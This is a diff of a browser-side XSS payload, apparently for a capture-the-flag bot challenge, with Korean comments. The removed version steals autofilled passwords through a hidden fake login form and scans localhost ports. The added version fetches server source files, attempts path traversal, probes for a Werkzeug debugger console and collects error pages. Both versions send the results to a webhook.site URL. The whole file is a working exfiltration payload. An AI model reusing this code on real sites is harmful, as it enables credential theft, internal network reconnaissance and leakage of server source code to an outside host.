@@ -1,79 +1,73 @@
 (async () => {
-    const WEBHOOK = 'https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3'; // 본인의 웹훅 주소
+    const WEBHOOK = 'https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3';
 
-    // 1. [기법 A] 가짜 로그인 폼 주입 (Autofill 탈취)
-    // 봇이 "127.0.0.1"에 대해 저장된 비밀번호(Flag)가 있다면,
-    // 브라우저가 이 폼을 자동으로 채워줄 수 있습니다.
-    const fakeForm = document.createElement('div');
-    fakeForm.innerHTML = `
-        <form id="fake-login" style="opacity:0; position:absolute; top:-9999px;">
-            <input type="text" name="username" value="admin">
-            <input type="password" name="password">
-        </form>
-    `;
-    document.body.appendChild(fakeForm);
+    // 1. 소스 코드 파일 직접 접근 시도
+    // Flask가 정적 파일 규칙을 잘못 설정했거나, 루트에 파일이 노출된 경우 확인
+    const filesToFetch = [
+        '/bot.py',
+        '/app.py',
+        '/Dockerfile',
+        '/static/../bot.py', // 상위 디렉토리 탐색(Traversal) 시도
+        '/__pycache__/bot.cpython-311.pyc' // 컴파일된 파이썬 파일
+    ];
 
-    // 브라우저가 채울 시간을 줌
-    await new Promise(r => setTimeout(r, 1000));
-    const passwordField = document.querySelector('input[type="password"]');
-    const stolenPassword = passwordField ? passwordField.value : "No Input Found";
-
-    // 2. [기법 B] 내부 포트 스캔 (Intranet Scanning)
-    // 127.0.0.1의 8000~9000번 포트 등에 숨겨진 서비스가 있는지 확인합니다.
-    const portsToScan = [80, 8080, 8000, 8888, 9000, 1337, 3000, 5001];
-    let scanResults = {};
-
-    for (let port of portsToScan) {
+    let fileResults = {};
+    for (const path of filesToFetch) {
         try {
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 1000); // 1초 타임아웃
-
-            // no-cors 모드로 요청 (내용은 못 읽어도 에러 여부로 포트 오픈 확인 가능)
-            // 만약 운 좋게 CORS가 열려있거나 단순 텍스트라면 읽힐 수도 있음
-            const res = await fetch(`http://127.0.0.1:${port}/`, { 
-                mode: 'no-cors', 
-                signal: controller.signal 
-            });
-            clearTimeout(timeoutId);
-            scanResults[port] = "Open (Status: " + res.status + ")";
-            
-            // 만약 읽을 수 있는 응답이라면 내용을 가져옴 (CORS 허용 시)
-            try {
-                // Same-Origin이 아니므로 mode: 'cors'가 필요하지만, 
-                // 혹시 내부 서비스가 Access-Control-Allow-Origin: * 일 수 있음
-                const textRes = await fetch(`http://127.0.0.1:${port}/`);
-                const text = await textRes.text();
-                scanResults[port + "_content"] = text.substring(0, 200); // 앞부분만
-            } catch(e) {}
-
+            const res = await fetch(path);
+            if (res.status === 200) {
+                fileResults[path] = await res.text();
+            } else {
+                fileResults[path] = `Status ${res.status}`;
+            }
         } catch (e) {
-            // 타임아웃이나 Connection Refused는 보통 닫힌 포트
-            // scanResults[port] = "Closed/Error"; 
+            fileResults[path] = "Error";
         }
     }
 
-    // 3. [기법 C] 메인 페이지 헤더 전수 조사 (Header Injection 확인)
-    // 지난번에 본문만 보고 헤더를 놓쳤을 수 있습니다.
-    let indexHeaders = "";
+    // 2. Werkzeug Debugger Console 확인
+    // 디버거가 열려있다면 HTML에 "__debugger__" 같은 문자열이 포함됨
+    let consoleResult = "Failed";
     try {
-        const res = await fetch('/', {method: 'HEAD'});
-        for (const [k, v] of res.headers.entries()) {
-            indexHeaders += `${k}: ${v}\n`;
+        const res = await fetch('/console');
+        if (res.status === 200) {
+            const text = await res.text();
+            // 내용이 너무 길 수 있으므로 특정 키워드나 앞부분만 자름
+            consoleResult = text.includes('Werkzeug') ? "Active! (Werkzeug Found)" : "Inactive";
+            // 만약 Active라면 전체 HTML을 훔쳐야 함 (이번엔 생략하고 상태만 확인)
+        } else {
+            consoleResult = `Status ${res.status}`;
         }
-    } catch(e) { indexHeaders = e.toString(); }
+    } catch (e) {
+        consoleResult = e.toString();
+    }
+
+    // 3. 강제 에러 유발 (Traceback 확인)
+    // 존재하지 않는 템플릿이나 잘못된 입력을 보내 500 에러 유도
+    // (이 앱은 404를 잘 처리하므로, 로직 에러를 찾아야 함. 
+    //  예: POST 데이터 없이 /note/new 호출 등은 200 OK라서 어려움)
+    // 여기선 단순히 이상한 경로 호출로 Flask 디폴트 에러 페이지 확인
+    let errorPageResult = "";
+    try {
+        // Flask는 보통 리소스가 없으면 404지만, 
+        // URL 길이 제한 초과 등을 이용해 서버 에러를 유발할 수도 있음.
+        // 일단은 404 페이지에 디버그 정보가 있는지 확인
+        const res = await fetch('/this_page_does_not_exist_xyz');
+        errorPageResult = await res.text();
+    } catch(e) {}
 
     // 데이터 전송
     const data = {
-        msg: "Phase 3 Data",
-        autofillPassword: stolenPassword, // 여기에 Flag가 있을 수 있음
-        internalPorts: JSON.stringify(scanResults), // 열린 포트 확인
-        indexHeaders: indexHeaders, // 헤더 확인
+        msg: "Server Leak Probe",
+        files: fileResults,
+        debuggerStatus: consoleResult,
+        errorPageSample: errorPageResult.substring(0, 500), // 앞부분만 확인
         location: window.location.href
     };
 
     fetch(WEBHOOK, {
         method: 'POST',
-        mode: 'no-cors',
+        mode: 'no-cors', // CORS 무시하고 보냄
         body: JSON.stringify(data)
     });
 })();
